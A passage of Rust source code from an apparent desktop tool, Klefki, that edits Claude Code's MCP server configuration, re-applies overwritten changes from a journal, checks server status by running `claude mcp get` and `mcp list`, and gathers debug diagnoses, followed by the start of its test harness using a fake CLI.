                && match &add.project {
                    None => r.scope == Scope::User,
                    Some(p) => {
                        r.scope == Scope::Local
                            && r.project.as_deref().map(inventory::normalise_project)
                                == Some(inventory::normalise_project(p))
                    }
                }
        });
        let Some(row) = row else {
            return Err(format!(
                "Claude Code said it added {name} {place}, but Klefki cannot find it there.{}",
                done(added)
            ));
        };
        let earlier = done(added);
        added.push(format!("{name} {place}"));
        if let (Some(secret), Some(store)) = (&add.secret, &steps.store)
            && let Err(e) = store.set(&row.connection, secret)
        {
            return Err(format!(
                "{name} was added {place}, and Claude Code keeps its client secret, but Klefki could not keep its own copy: {e} Type it in on the server's Auth tab to try again.{earlier}"
            ));
        }
    }
    Ok(())
}

/// The changes klefki wrote to one file and has not yet checked, oldest first: a small redo log. Claude Code may
/// write without our lock from a copy it read earlier; replaying the log in order puts every overwritten change
/// back, and two changes to the same thing end the way the later one says.
#[derive(Default)]
struct Journal {
    /// The sequence number of the latest change started on the file.
    latest: u64,
    pending: Vec<(u64, Plan)>,
}

impl Journal {
    fn start(&mut self) -> u64 {
        self.latest += 1;
        self.latest
    }
}

/// Shortly after a change, off the engine thread, checks each file it started on against that file's whole log.
/// Only the latest change on a file checks it (older ones stand down, the newest log covers theirs), the way a
/// database groups commits; once checked, the logged changes are retired.
fn check_later(shared: &Shared, id: u64, started: Vec<(Docstore, u64)>) {
    let journals = Arc::clone(&shared.journals);
    let logs: Vec<_> = {
        let j = lock(&journals);
        started
            .into_iter()
            .filter_map(|(store, lsn)| {
                let pending = &j.get(&store.path)?.pending;
                let last = pending.last()?.0;
                let log: Vec<Plan> = pending.iter().map(|(_, p)| p.clone()).collect();
                Some((store, lsn, last, log))
            })
            .collect()
    };
    if logs.is_empty() {
        return;
    }
    let emitter = shared.emitter.clone();
    let input = shared.input.clone();
    std::thread::spawn(move || {
        let mut reapplied = false;
        let mut failed = Vec::new();
        for (store, lsn, last, log) in &logs {
            let superseded = || lock(&journals).get(&store.path).map(|j| j.latest) != Some(*lsn);
            let result = store.verify(log, &superseded);
            // Retired whatever the outcome: a log that cannot be put back is reported now, not retried forever.
            if let Some(j) = lock(&journals).get_mut(&store.path)
                && j.latest == *lsn
            {
                j.pending.retain(|(n, _)| n > last);
            }
            match result {
                Ok(again) => reapplied |= again,
                // The other files are still checked: each has its own log to retire.
                Err(e) => failed.push((store.path.clone(), e)),
            }
        }
        if reapplied {
            // The engine thread reads the files again, as for any change on disk.
            let _ = input.send(Input::FilesChanged);
        }
        if !failed.is_empty() {
            emitter.emit(Event::ApplyFailed {
                plan: id,
                error: after_save_failures(&failed),
            });
        } else if reapplied {
            emitter.emit(Event::Reapplied { plan: id });
        }
    });
}

/// Why the check after a save failed, once per reason, naming the files. The change itself was saved.
fn after_save_failures(failed: &[(PathBuf, StoreError)]) -> String {
    let mut reasons: Vec<(String, Vec<String>)> = Vec::new();
    for (path, e) in failed {
        let reason = match e {
            StoreError::Locked | StoreError::Changed => {
                "Claude Code was busy writing its configuration. Look \
                again in a moment, and make the change again if it is gone."
                    .to_owned()
            }
            other => other.to_string(),
        };
        let file = sanitize(&path.display().to_string());
        match reasons.iter_mut().find(|(r, _)| *r == reason) {
            Some((_, files)) => files.push(file),
            None => reasons.push((reason, vec![file])),
        }
    }
    reasons
        .iter()
        .map(|(reason, files)| {
            format!(
                "After saving, the check of {} failed: {reason}",
                files.join(", ")
            )
        })
        .collect::<Vec<_>>()
        .join(" ")
}

fn lock<T>(m: &Mutex<T>) -> MutexGuard<'_, T> {
    m.lock().unwrap_or_else(|e| e.into_inner())
}

/// The engine thread's view: the current snapshot, how the files spell its servers, and the watcher that tells when
/// it is out of date.
struct State {
    snapshot: Arc<Snapshot>,
    keys: FileKeys,
    watch: Option<Watch>,
    /// The sign-in running now, or the last one.
    sign_in: Option<sign_in::Running>,
}

impl State {
    /// Reads the configuration again and returns the snapshot it replaces, and the servers still there whose
    /// definition changed. A check of a changed or removed server that is running now will not answer. The
    /// watcher's baseline is taken just before reading, so a change made meanwhile is noticed afterwards instead of
    /// being lost.
    fn reload(&mut self, shared: &Shared) -> (Arc<Snapshot>, HashSet<crate::model::ConnectionId>) {
        let next = match &shared.config.paths {
            Some(paths) => {
                if let Some(watch) = &self.watch {
                    watch.rebase(watch::watched_files(paths, &self.snapshot));
                }
                let next = inventory::load(paths);
                if let Some(watch) = &self.watch {
                    // Projects that just appeared start being watched from now.
                    watch.extend(watch::watched_files(paths, &next.snapshot));
                }
                next
            }
            None => inventory::Inventory {
                snapshot: Snapshot {
                    warnings: vec![
                        "Could not determine where Claude Code keeps its configuration.".to_owned(),
                    ],
                    ..Snapshot::default()
                },
                keys: FileKeys::new(),
            },
        };
        let before_keys = std::mem::replace(&mut self.keys, next.keys);
        let mut edited = HashSet::new();
        {
            let mut changes = lock(&shared.changes);
            for (connection, old) in &before_keys {
                match self.keys.get(connection) {
                    Some(new) if new.definition == old.definition => {}
                    Some(_) => {
                        changes.note(connection);
                        edited.insert(connection.clone());
                    }
                    None => changes.note(connection),
                }
            }
        }
        let mut snapshot = next.snapshot;
        snapshot.kept = kept_list(shared);
        let before = std::mem::replace(&mut self.snapshot, Arc::new(snapshot));
        shared
            .emitter
            .emit(Event::Snapshot(Arc::clone(&self.snapshot)));
        let running: HashSet<_> = {
            let mut queue = lock(&shared.queue);
            // A waiting check of a server that is gone would start a process for nothing.
            queue
                .jobs
                .retain(|j| self.keys.contains_key(&j.id.connection));
            let changes = lock(&shared.changes);
            // Not those whose server changed since they started: their answer will not come.
            queue
                .announced
                .iter()
                .filter(|r| {
                    !edited.contains(&r.connection)
                        && r.started.is_none_or(|n| !changes.since(&r.connection, n))
                })
                .map(|r| r.connection.clone())
                .collect()
        };
        // The snapshot made the app forget which checks are running.
        for row in self
            .snapshot
            .servers
            .iter()
            .filter(|r| running.contains(&r.connection))
        {
            shared.emitter.status(row.id(), Status::Checking, None);
        }
        (before, edited)
    }
}

/// The definitions Klefki kept because a change could not put them back, as the snapshot lists them.
fn kept_list(shared: &Shared) -> Vec<crate::api::Kept> {
    let (Some(dir), Some(paths)) = (&shared.config.backup_dir, &shared.config.paths) else {
        return Vec::new();
    };
    // The system's store is opened only when a listing needs it: opening it can be slow, or ask the user.
    swap::Recovery::list(dir, &paths.claude_json, &|| secret_store(shared).ok())
        .into_iter()
        .map(|(r, back)| crate::api::Kept {
            id: r.id,
            name: sanitize(&r.name),
            place: swap::place(r.project.as_deref()),
            signs_in: swap::signs_in(&r.entry),
            back,
        })
        .collect()
}

fn refresh(shared: &Shared, state: &mut State, live_all: bool) {
    let (_, edited) = state.reload(shared);
    // Checks the user asked for stay: a server that is off, or a project's, would not be queued again.
    lock(&shared.queue).jobs.retain(|j| !j.background);
    let snapshot = &state.snapshot;

    let cli = locate::locate(&locate::Search {
        explicit: shared.config.claude.as_deref(),
        home: shared.config.home.as_deref(),
        path_var: shared.config.path_var.as_deref(),
    });
    let program = match cli {
        Ok(p) => p,
        Err(e) => {
            *shared.claude.write().unwrap_or_else(|e| e.into_inner()) = None;
            shared.emitter.emit(Event::CliProblem(format!(
                "Live status is unavailable: {e}."
            )));
            show_edited(shared, snapshot, &edited, &HashSet::new(), &HashSet::new());
            return;
        }
    };
    *shared.claude.write().unwrap_or_else(|e| e.into_inner()) = Some(program.clone());
    shared
        .emitter
        .emit(Event::CliVersion(cached_cli_version(shared, &program)));

    let mut jobs = Vec::new();
    let mut tried = HashSet::new();
    let mut folders = Folders::default();
    let keys = &state.keys;
    for row in &snapshot.servers {
        let edit = edited.contains(&row.connection);
        // Project servers run the repository's own command: only on an explicit request. A plugin's servers are not
        // checked: their names are not ones Klefki passes to `claude` (decision 008).
        let wanted = matches!(row.scope, Scope::User | Scope::Local)
            && row.enabled
            && (live_all || (shared.config.background_checks && (edit || needs_check(row))));
        if wanted && edit {
            tried.insert(row.connection.clone());
        }
        if wanted
            && let Some(mut job) = build_job(
                shared,
                &mut folders,
                row,
                keys.get(&row.connection),
                JobKind::Check,
                edit || row.status == Status::Unknown,
            )
        {
            job.background = !live_all;
            jobs.push(job);
        }
    }
    let checking = queue_checks(shared, jobs, &edited);
    show_edited(shared, snapshot, &edited, &tried, &checking);
}

/// After the configuration changed (by klefki, or on disk from outside): show the new state, and check only servers
/// the change switched on or edited. A full refresh would look for the CLI again, ask its version, and check servers
/// the change did not touch, each one a process start that the change did not call for.
fn reload_after_change(shared: &Shared, state: &mut State) {
    if shared.config.paths.is_none() {
        return;
    }
    let (before, edited) = state.reload(shared);
    let snapshot = &state.snapshot;
    // The same server in both snapshots is the same connection, as the file spells it, not the shown name.
    let was_on: HashSet<_> = before
        .servers
        .iter()
        .filter(|old| old.enabled)
        .map(|old| &old.connection)
        .collect();
    let mut jobs = Vec::new();
    let mut tried = HashSet::new();
    let mut folders = Folders::default();
    for row in &snapshot.servers {
        let edit = edited.contains(&row.connection);
        let wanted = shared.config.background_checks
            && matches!(row.scope, Scope::User | Scope::Local)
            && row.enabled
            && (edit || (needs_check(row) && !was_on.contains(&row.connection)));
        if !wanted {
            continue;
        }
        if edit {
            tried.insert(row.connection.clone());
        }
        if let Some(job) = build_job(
            shared,
            &mut folders,
            row,
            state.keys.get(&row.connection),
            JobKind::Check,
            edit || row.status == Status::Unknown,
        ) {
            jobs.push(Job {
                background: true,
                ..job
            });
        }
    }
    let checking = queue_checks(shared, jobs, &edited);
    show_edited(shared, snapshot, &edited, &tried, &checking);
}

/// Queues background checks and returns the edited servers among them. A background check of an edited server
/// still waiting is replaced: it may not have said it was checking.
fn queue_checks(
    shared: &Shared,
    jobs: Vec<Job>,
    edited: &HashSet<crate::model::ConnectionId>,
) -> HashSet<crate::model::ConnectionId> {
    let checking: HashSet<_> = jobs
        .iter()
        .map(|j| j.id.connection.clone())
        .filter(|c| edited.contains(c))
        .collect();
    if !jobs.is_empty() {
        let mut queue = lock(&shared.queue);
        queue.jobs.retain(|q| {
            !(q.background && q.kind == JobKind::Check && checking.contains(&q.id.connection))
        });
        queue.add(jobs);
        drop(queue);
        shared.wake_workers.notify_all();
    }
    checking
}

/// The status the app shows for an edited server is about its old definition. Each says it is being checked again
/// (`checking`), or no longer claims a verdict. Those `tried` but not checking already said why they cannot be.
fn show_edited(
    shared: &Shared,
    snapshot: &Snapshot,
    edited: &HashSet<crate::model::ConnectionId>,
    tried: &HashSet<crate::model::ConnectionId>,
    checking: &HashSet<crate::model::ConnectionId>,
) {
    for row in snapshot.servers.iter().filter(|r| {
        edited.contains(&r.connection)
            && (checking.contains(&r.connection) || !tried.contains(&r.connection))
    }) {
        if checking.contains(&row.connection) {
            shared.emitter.status(row.id(), Status::Checking, None);
        } else if row.status_cached || row.status == Status::Unknown {
            shared.emitter.status(
                row.id(),
                Status::Unknown,
                Some("changed since its last check".to_owned()),
            );
        } else {
            // What the files say (waiting for approval), not a verdict of a check.
            shared.emitter.status(row.id(), row.status, None);
        }
    }
}

/// A row whose status klefki has not established: unknown, or only last known from Claude's cache (which can be any
/// age). A fresh needs-auth entry from Claude is not checked again until the user asks.
fn needs_check(row: &ServerRow) -> bool {
    row.status == Status::Unknown || row.status_cached
}

/// A check or diagnosis the user asked for: ahead of the background checks.
fn enqueue_now(shared: &Shared, state: &State, id: &ServerId, kind: JobKind) {
    let Some((row, file)) = inventory::locate(&state.snapshot, &state.keys, id) else {
        return;
    };
    if let Some(job) = build_job(shared, &mut Folders::default(), row, Some(file), kind, true) {
        lock(&shared.queue).push_now(job);
        shared.wake_workers.notify_one();
    }
}

/// Turns a row into a job, or reports why it cannot be run. A name that is not safe never reaches a spawn. `file` is
/// how the file spells the row: the name passed to `claude mcp get` and the project it runs in are those, never the
/// cleaned text shown (which could name another server, or another folder).
fn build_job(
    shared: &Shared,
    folders: &mut Folders,
    row: &ServerRow,
    file: Option<&FileKey>,
    kind: JobKind,
    announce: bool,
) -> Option<Job> {
    let refuse = |why: String| {
        match kind {
            // A row showing a last-known status keeps it: "not checked" would hide what little is known.
            JobKind::Check if !announce => {}
            JobKind::Check => shared.emitter.status(
                row.id(),
                Status::Unknown,
                Some(format!("not checked: {why}")),
            ),
            JobKind::Diagnose => shared.emitter.emit(Event::Diagnosis {
                id: row.id(),
                diagnosis: Diagnosis {
                    status: Status::Unknown,
                    detail: None,
                    hints: Vec::new(),
                    server_said: Vec::new(),
                    client_log: Vec::new(),
                    note: Some(format!("not diagnosed: {why}")),
                },
            }),
        }
        None
    };
    let (name, cwd) = match where_to_run(shared, folders, row, file) {
        Ok(found) => found,
        Err(why) => return refuse(why),
    };
    Some(Job {
        id: row.id(),
        name,
        cwd,
        kind,
        announce,
        background: false,
        now: false,
        alone: false,
    })
}

/// The name to pass to `claude` for a row and the folder to run it in, from how the file spells them, or why it
/// cannot run. Claude finds a local server through its working directory, so it runs in the project's folder.
fn where_to_run(
    shared: &Shared,
    folders: &mut Folders,
    row: &ServerRow,
    file: Option<&FileKey>,
) -> Result<(ServerName, PathBuf), String> {
    let Some(file) = file else {
        return Err("the server is no longer in the configuration".to_owned());
    };
    let name = ServerName::parse(&file.name)
        .map_err(|e| format!("the server name is not safe to pass to claude ({e})"))?;
    let cwd = match (row.scope, &file.project) {
        (Scope::User, _) => match &shared.config.home {
            Some(home) => home.clone(),
            None => return Err("no home folder".to_owned()),
        },
        (_, Some(project)) => {
            if !folders.usable(project) {
                return Err("the project folder was not found".to_owned());
            }
            PathBuf::from(project)
        }
        (_, None) => return Err("the project folder is unknown".to_owned()),
    };
    Ok((name, cwd))
}

/// Whether each project folder can be run in, looked up once per pass over the rows: a project has many servers.
#[derive(Default)]
struct Folders(HashMap<String, bool>);

impl Folders {
    fn usable(&mut self, project: &str) -> bool {
        if let Some(&usable) = self.0.get(project) {
            return usable;
        }
        let usable = inventory::is_safe_project_path(project) && Path::new(project).is_dir();
        self.0.insert(project.to_owned(), usable);
        usable
    }
}

fn worker(shared: &Shared) {
    loop {
        let job = {
            let mut queue = lock(&shared.queue);
            loop {
                if queue.shutdown {
                    return;
                }
                if let Some(job) = queue.take() {
                    break job;
                }
                queue = shared
                    .wake_workers
                    .wait(queue)
                    .unwrap_or_else(|e| e.into_inner());
            }
        };
        // Built only for a background job: dropping one gives a slot back.
        let _slot = job.background.then(|| BackgroundSlot {
            queue: &shared.queue,
            wake: &shared.wake_workers,
        });
        run(shared, &job);
    }
}

/// Says a job is checking, when it should, and notes the change count its answer is compared with. Taken after the
/// announcement: an edit noted before this is one the check will see.
fn begin<'a>(shared: &'a Shared, job: &Job) -> (Option<Announced<'a>>, u64) {
    let announced = job
        .announce
        .then(|| Announced::new(&shared.queue, &job.id.connection));
    if job.announce {
        shared
            .emitter
            .status(job.id.clone(), Status::Checking, None);
    }
    let started = lock(&shared.changes).count;
    if let Some(a) = &announced {
        a.started(started);
    }
    (announced, started)
}

fn run(shared: &Shared, job: &Job) {
    let (_announced, started) = begin(shared, job);
    // An answer about a server edited or removed while this ran is about a definition that is gone.
    let current = || !lock(&shared.changes).since(&job.id.connection, started);
    match job.kind {
        JobKind::Check => {
            let listed = if job.background {
                check_listed(shared, job)
            } else {
                ListedCheck::Not
            };
            let (status, detail) = match listed {
                ListedCheck::Answer(answer) => answer,
                ListedCheck::Not => execute(shared, job),
                // Its `get` goes in the queue behind those of the servers that were only slow.
                ListedCheck::Later => return,
            };
            if current() {
                shared.emitter.status(job.id.clone(), status, detail);
            }
        }
        JobKind::Diagnose => {
            let diagnosis = run_diagnose(shared, job);
            if current() {
                shared
                    .emitter
                    .status(job.id.clone(), diagnosis.status, diagnosis.detail.clone());
                shared.emitter.emit(Event::Diagnosis {
                    id: job.id.clone(),
                    diagnosis,
                });
            } else {
                // The user asked: say why there is no diagnosis, instead of none ever coming.
                shared.emitter.emit(Event::Diagnosis {
                    id: job.id.clone(),
                    diagnosis: Diagnosis {
                        status: Status::Unknown,
                        detail: None,
                        hints: Vec::new(),
                        server_said: Vec::new(),
                        client_log: Vec::new(),
                        note: Some(
                            "not diagnosed: the server changed while it ran; diagnose it again"
                                .to_owned(),
                        ),
                    },
                });
            }
        }
    }
}

fn cli_env(shared: &Shared) -> Vec<(&str, &OsStr)> {
    shared
        .config
        .cli_env
        .iter()
        .map(|(k, v)| (k.as_str(), v.as_os_str()))
        .collect()
}

/// The environment of a run that checks a server. A check ends whatever Claude leaves running
/// (`RunSpec::end_leftovers`), so it must not start an update of Claude that would be ended with it.
fn check_env(shared: &Shared) -> Vec<(&str, &OsStr)> {
    let mut env = cli_env(shared);
    env.push(("DISABLE_AUTOUPDATER", OsStr::new("1")));
    env
}

fn cached_cli_version(shared: &Shared, program: &Path) -> Option<String> {
    let stamp = ProgramStamp::of(program);
    if let (Some(stamp), Some((known, version))) = (&stamp, &*lock(&shared.version))
        && stamp == known
    {
        return version.clone();
    }
    let version = cli_version(shared, program);
    // Only an answer is kept: a failed ask (a timeout, a virus scan on first start) is tried again next time.
    if let (Some(stamp), Some(_)) = (stamp, &version) {
        *lock(&shared.version) = Some((stamp, version.clone()));
    }
    version
}

fn cli_version(shared: &Shared, program: &Path) -> Option<String> {
    let out = runner::run(&RunSpec {
        program,
        args: &["--version"],
        cwd: shared.config.home.as_deref(),
        env: &cli_env(shared),
        timeout: VERSION_TIMEOUT,
        max_output: 1024,
        end_leftovers: false,
    })
    .ok()?;
    let token = out.stdout.split_whitespace().next()?;
    (out.exit_code == Some(0) && token.starts_with(|c: char| c.is_ascii_digit()))
        .then(|| clip(token, 32))
}

fn claude_program(shared: &Shared) -> Option<PathBuf> {
    shared
        .claude
        .read()
        .unwrap_or_else(|e| e.into_inner())
        .clone()
}

/// What `check_listed` made of the job it was given.
enum ListedCheck {
    /// The list answered for it.
    Answer((Status, Option<String>)),
    /// No list was run for it: check it with `get` now.
    Not,
    /// The list had no answer for it, and it is queued again, to be checked with `get` in its turn.
    Later,
}

/// Answers the other background checks waiting in the job's folder from one `claude mcp list`, and returns the answer
/// for the job itself when the list had a clear one. A server the list did not answer clearly goes back to the queue
/// to be checked on its own, so what is shown is always what `claude mcp get` says. A list that answered nothing
/// ends listing for the rest of the run, and the job is checked as usual.
fn check_listed(shared: &Shared, job: &Job) -> ListedCheck {
    if job.alone || !shared.list_works.load(Ordering::Relaxed) {
        return ListedCheck::Not;
    }
    let Some(program) = claude_program(shared) else {
        return ListedCheck::Not;
    };
    let mates = lock(&shared.queue).take_mates(&job.cwd);
    if mates.is_empty() {
        return ListedCheck::Not;
    }
    let begun: Vec<_> = mates
        .into_iter()
        .map(|mate| {
            let started = begin(shared, &mate);
            (mate, started)
        })
        .collect();
    let names: Vec<&str> = std::iter::once(job.name.as_str())
        .chain(begun.iter().map(|(mate, _)| mate.name.as_str()))
        .collect();
    let env = list_env(cli_env(shared));
    let result = runner::run(&RunSpec {
        program: &program,
        args: &["mcp", "list"],
        cwd: Some(&job.cwd),
        env: &env,
        timeout: shared.config.check_timeout,
        max_output: MAX_LIST_OUTPUT,
        // It starts the servers, as `mcp get` does: none may outlive it.
        end_leftovers: true,
    });
    let answers = match result {
        Ok(out) if !out.timed_out && out.exit_code == Some(0) => {
            // Cut off in the middle of a line: that line is not read.
            let text = match (out.truncated, out.stdout.rfind('\n')) {
                (true, Some(end)) => &out.stdout[..end],
                (true, None) => "",
                (false, _) => out.stdout.as_str(),
            };
            parse::parse_list(text, &names)
        }
        _ => HashMap::new(),
    };
    if answers.is_empty() {
        shared.list_works.store(false, Ordering::Relaxed);
    }
    // The servers the list did not answer, with whether each never answered the connection.
    let mut again: Vec<(Job, bool)> = Vec::new();
    for (mate, (_announced, started)) in begun {
        match answers.get(mate.name.as_str()) {
            Some(parse::Listed::Settled(checked)) => {
                // Edited or removed while the list ran: the answer is about a definition that is gone.
                if !lock(&shared.changes).since(&mate.id.connection, started) {
                    shared
                        .emitter
                        .status(mate.id.clone(), checked.status, checked.detail.clone());
                }
            }
            other => again.push((
                Job {
                    alone: true,
                    ..mate
                },
                never_connected(other),
            )),
        }
    }
    let own = answers.get(job.name.as_str());
    if let Some(parse::Listed::Settled(checked)) = own {
        let answer = (checked.status, checked.detail.clone());
        return queue_again(shared, again, ListedCheck::Answer(answer));
    }
    // The job has no answer either: it waits for its turn like the others, so that a server that hangs does not
    // hold the rest back with its 30 s. It was taken before them, so it stays ahead of them.
    again.insert(
        0,
        (
            Job {
                alone: true,
                ..job.clone()
            },
            never_connected(own),
        ),
    );
    queue_again(shared, again, ListedCheck::Later)
}

fn never_connected(listed: Option<&parse::Listed>) -> bool {
    matches!(
        listed,
        Some(parse::Listed::Open {
            never_connected: true
        })
    )
}

/// Queues the servers a list did not answer, those that answered the connection too slowly first and those that never
/// did last (the order within each stays), and returns `then`.
fn queue_again(shared: &Shared, mut again: Vec<(Job, bool)>, then: ListedCheck) -> ListedCheck {
    again.sort_by_key(|(_, never_connected)| *never_connected);
    if !again.is_empty() {
        lock(&shared.queue).add(again.into_iter().map(|(job, _)| job).collect());
    }
    then
}

fn execute(shared: &Shared, job: &Job) -> (Status, Option<String>) {
    let Some(program) = claude_program(shared) else {
        return (
            Status::Unknown,
            Some("the claude CLI is not available".to_owned()),
        );
    };
    let timeout = shared.config.check_timeout;
    let result = runner::run(&RunSpec {
        program: &program,
        args: &["mcp", "get", job.name.as_str()],
        cwd: Some(&job.cwd),
        env: &check_env(shared),
        timeout,
        max_output: MAX_CHECK_OUTPUT,
        end_leftovers: true,
    });
    interpret(result, timeout)
}

/// What a finished `claude mcp get` means: a status, and a reason when there is no verdict.
fn interpret(result: io::Result<RunOutput>, timeout: Duration) -> (Status, Option<String>) {
    match result {
        Err(e) => (
            Status::Unknown,
            Some(clip(
                &format!("could not run claude: {}", sanitize(&e.to_string())),
                MAX_DETAIL_CHARS,
            )),
        ),
        Ok(out) if out.timed_out => (
            Status::Unknown,
            Some(format!(
                "check timed out after {:.1}s",
                timeout.as_secs_f32()
            )),
        ),
        Ok(out) if out.exit_code != Some(0) => {
            let line = out
                .stderr
                .lines()
                .map(str::trim)
                .find(|l| !l.is_empty())
                .map(|l| clip(l, MAX_DETAIL_CHARS))
                .unwrap_or_else(|| format!("claude exited with code {:?}", out.exit_code));
            (Status::Unknown, Some(line))
        }
        Ok(out) => {
            let checked = parse::parse_get(&out.stdout);
            if checked.status == Status::Unknown && checked.detail.is_none() {
                (
                    Status::Unknown,
                    Some("unrecognised output from claude".to_owned()),
                )
            } else {
                (checked.status, checked.detail)
            }
        }
    }
}

/// Runs the check again with the client's own debug output and turns that into a safe, readable diagnosis.
/// The debug file lives in a private temporary folder that is removed when this function returns.
fn run_diagnose(shared: &Shared, job: &Job) -> Diagnosis {
    let nothing = |note: String| Diagnosis {
        status: Status::Unknown,
        detail: None,
        hints: Vec::new(),
        server_said: Vec::new(),
        client_log: Vec::new(),
        note: Some(note),
    };
    let Some(program) = claude_program(shared) else {
        return nothing("the claude CLI is not available".to_owned());
    };
    let dir = match tempfile::Builder::new()
        .prefix("klefki-diagnose-")
        .tempdir()
    {
        Ok(dir) => dir,
        Err(e) => {
            return nothing(format!(
                "could not create a private temporary folder: {}",
                sanitize(&e.to_string())
            ));
        }
    };
    let file = dir.path().join("debug.log");
    let Some(file_arg) = file.to_str() else {
        return nothing("the temporary path is not valid text".to_owned());
    };
    let timeout = shared.config.check_timeout;
    let result = runner::run(&RunSpec {
        program: &program,
        args: &[
            "--debug",
            "mcp",
            "--debug-file",
            file_arg,
            "mcp",
            "get",
            job.name.as_str(),
        ],
        cwd: Some(&job.cwd),
        env: &check_env(shared),
        timeout,
        max_output: MAX_CHECK_OUTPUT,
        end_leftovers: true,
    });
    let stderr = result
        .as_ref()
        .ok()
        .map(|o| o.stderr.clone())
        .unwrap_or_default();
    let timed_out = matches!(&result, Ok(o) if o.timed_out);
    let (status, detail) = interpret(result, timeout);

    let (debug_text, read_note) = match fsx::read_limited(&file, MAX_DEBUG_FILE) {
        Ok(Some(text)) => (text, None),
        Ok(None) => (
            String::new(),
            Some("the client wrote no debug output".to_owned()),
        ),
        Err(e) => (
            String::new(),
            Some(format!(
                "could not read the debug output: {}",
                sanitize(&e.to_string())
            )),
        ),
    };
    let note = if timed_out { detail.clone() } else { read_note };
    let said = format!("{}\n{}", detail.as_deref().unwrap_or(""), stderr);
    let report = report::build(&debug_text, job.name.as_str(), &said);
    Diagnosis {
        status,
        detail,
        hints: report
            .hints
            .iter()
            .map(|&kind| hint(kind, &format!("{said}\n{debug_text}")))
            .collect(),
        server_said: report.server_said,
        client_log: report.client_log,
        note,
    }
}

/// `said` is the text the failure was recognised in, where its error code is looked up.
fn hint(kind: HintKind, said: &str) -> Hint {
    Hint {
        title: kind.title().to_owned(),
        code: kind.code_in(said).map(str::to_owned),
        help: kind.help().iter().map(|&line| line.to_owned()).collect(),
        points_at: kind
            .points_at()
            .map(|(focus, label)| (focus, label.to_owned())),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::cli::testutil::{fake_claude, write_scenario};
    use crate::model::Target;
    use std::time::Instant;

    /// Long enough for a slow machine: starting a process took 1-3 s while a whole run of these tests started them at once.
    const WAIT: Duration = Duration::from_secs(60);

    struct Env {
        dir: tempfile::TempDir,
        log: PathBuf,
        /// Links the engine asked to open in a browser. Tests never open one.
        opened: Arc<Mutex<Vec<String>>>,
        /// What the save dialog answers. Tests never show one.
        chosen: Arc<Mutex<Option<PathBuf>>>,
    }

    impl Env {
        fn new(claude_json: &serde_json::Value, scenario: &str, files: &[(&str, &[u8])]) -> Self {
            let dir = tempfile::tempdir().unwrap();
            std::fs::create_dir_all(dir.path().join("cfg")).unwrap();
            std::fs::create_dir_all(dir.path().join("home")).unwrap();
            std::fs::write(
                dir.path().join("cfg").join(".claude.json"),
                claude_json.to_string(),
            )
            .unwrap();
            write_scenario(dir.path(), scenario, files);
            let log = dir.path().join("log.jsonl");
            Env {
                dir,
                log,
                opened: Arc::default(),
                chosen: Arc::default(),
            }
        }

        fn config(&self) -> EngineConfig {
            EngineConfig {
                paths: Some(ConfigPaths::in_dir(self.dir.path().join("cfg"))),
                claude: Some(fake_claude().to_path_buf()),
                home: Some(self.dir.path().join("home")),
                path_var: None,
                cli_env: vec![
                    (
                        "FAKE_CLAUDE_SCENARIO".into(),
                        self.dir.path().join("scenario.json").into(),
                    ),
                    ("FAKE_CLAUDE_LOG".into(), self.log.clone().into()),
                ],
                backup_dir: Some(self.dir.path().join("backups")),
                verify_delay: Duration::from_millis(50),
                max_checks: 3,
                check_timeout: Duration::from_secs(10),
                background_checks: true,
                watch_interval: Some(Duration::from_millis(40)),
                watch_settle: Duration::from_millis(120),
                // Never the real keychain in tests.
                secrets: Some(Arc::new(crate::secrets::MemoryStore::default())),
                open_url: {
                    let opened = Arc::clone(&self.opened);
                    Arc::new(move |link: &str| {
                        lock(&opened).push(link.to_owned());
                        Ok(())
                    })
                },
                open_dialog: {
                    let chosen = Arc::clone(&self.chosen);
                    Arc::new(move |_, _| Box::pin(std::future::ready(lock(&chosen).clone())))
                },
                pick_dialog: {
                    let chosen = Arc::clone(&self.chosen);
                    Arc::new(move |_| Box::pin(std::future::ready(lock(&chosen).clone())))
                },
                sign_in_timeout: Duration::from_secs(20),
                changer: None,
                desktop: crate::desktop::DesktopRoots::default(),
            }
        }

        fn start(&self) -> Core {
            start_with(self.config(), || {})
        }

        /// Every `mcp get <name>` the fake CLI was asked to run, with its start and end times.
        fn gets(&self) -> Vec<(String, u64, u64)> {
            let lines: Vec<serde_json::Value> = std::fs::read_to_string(&self.log)
                .unwrap_or_default()
                .lines()
                .map(|l| {
                    serde_json::from_str(l).unwrap_or_else(|e| panic!("bad log line {l:?}: {e}"))
                })
                .collect();
            let mut out = Vec::new();
            for start in lines.iter().filter(|l| l["event"] == "start") {
                let argv = start["argv"].as_array().unwrap();
                if argv.len() == 3 && argv[0] == "mcp" && argv[1] == "get" {
                    let end = lines
                        .iter()
                        .find(|l| l["event"] == "end" && l["argv"] == start["argv"])
                        .map(|l| l["ms"].as_u64().unwrap())
                        .unwrap_or(u64::MAX);
                    out.push((
                        argv[2].as_str().unwrap().to_owned(),
                        start["ms"].as_u64().unwrap(),
                        end,
                    ));
                }
            }
            out
        }

        /// The folder of every `mcp list` the fake CLI was asked to run, in order.
        fn lists(&self) -> Vec<String> {
            std::fs::read_to_string(&self.log)
                .unwrap_or_default()
                .lines()
                .filter_map(|l| serde_json::from_str::<serde_json::Value>(l).ok())
                .filter(|l| {
                    l["event"] == "start" && l["argv"] == serde_json::json!(["mcp", "list"])
                })
                .map(|l| l["cwd"].as_str().unwrap_or_default().to_owned())
                .collect()
        }
    }

    /// Collects events until `done` says so, or panics after `WAIT`.
    fn collect(core: &Core, mut done: impl FnMut(&[Event]) -> bool) -> Vec<Event> {
        let deadline = Instant::now() + WAIT;
        let mut events = Vec::new();
        loop {
            while let Some(e) = core.try_recv() {
                events.push(e);
            }
            if done(&events) {
                return events;
            }
            assert!(Instant::now() < deadline, "timed out; got {events:#?}");
            std::thread::sleep(Duration::from_millis(20));
        }
    }

    fn status_of(events: &[Event], name: &str) -> Option<(Status, Option<String>)> {
        events.iter().rev().find_map(|e| match e {
            Event::Status {
                id, status, detail, ..
            } if id.name == name => Some((*status, detail.clone())),
            _ => None,
        })
    }

    fn final_status(events: &[Event], name: &str) -> Option<Status> {
        events
            .iter()
            .filter_map(|e| match e {
                Event::Status { id, status, .. }
                    if id.name == name && *status != Status::Checking =>
                {
                    Some(*status)
                }
                _ => None,
            })
            .next_back()
    }

    const CONNECTED: &[u8] = include_bytes!("../../../fixtures/mcp-get/connected-stdio.txt");
    const FAILED: &[u8] = include_bytes!("../../../fixtures/mcp-get/failed-stdio.txt");
    const PENDING: &[u8] = include_bytes!("../../../fixtures/mcp-get/pending-approval.txt");

    fn http(url: &str) -> serde_json::Value {
